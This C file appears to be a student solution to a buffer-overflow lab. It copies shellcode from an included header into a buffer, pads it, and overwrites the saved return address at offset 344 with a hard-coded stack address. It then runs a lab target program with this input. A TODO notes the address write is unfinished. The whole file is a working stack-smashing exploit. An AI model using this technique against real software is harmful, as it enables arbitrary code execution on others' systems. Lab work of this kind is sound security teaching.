#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[1];

    uint8_t input[370];
    /* return address lives at $rbp + 8
     * ($rbp + 8) - buf = 0x158 = 344 */
    memcpy(input, shellcode, sizeof(shellcode));
    for (int i = sizeof(shellcode) - 1; i < 344; i++) {
        input[i] = i % 254 + 1;
    }

    /* TODO: figure out how to write the high 4 bytes of zero */
    uint64_t *return_address = (uint64_t *) &input[344];
    *return_address = 0x40A4FD50;
    input[348] = 0x7f;
    input[349] = 0x00;

    args[0] = TARGET;
    args[1] = (char *) input;
    args[2] = NULL;

    env[0] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}

